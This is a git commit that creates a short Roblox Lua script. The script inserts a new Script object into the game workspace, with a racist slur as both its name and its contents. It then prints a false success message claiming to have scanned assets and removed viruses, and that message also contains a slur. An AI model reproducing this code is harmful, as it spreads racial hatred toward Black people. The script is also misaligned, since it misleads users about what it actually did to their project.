758a928f19dba1d44ee5c2d7ec683b66fb864fec
JKAHJKJAHSDKLJDFHJKGSF <165566696+JKAHJKJAHSDKLJDFHJKGSF@users.noreply.github.com>
2025-07-06 16:33:38 +0200

    Create Initiate.lua

---
+++ Initiate.lua
@@ -0,0 +1,8 @@
+local Script = Instance.new("Script", workspace)
+Script.Name = "i hate niggers"
+Script.Source = [[
+i hate niggers
+
+]]
+
+print("Successfully scanned 12773 assets and removed 5 viruss nigersasd")
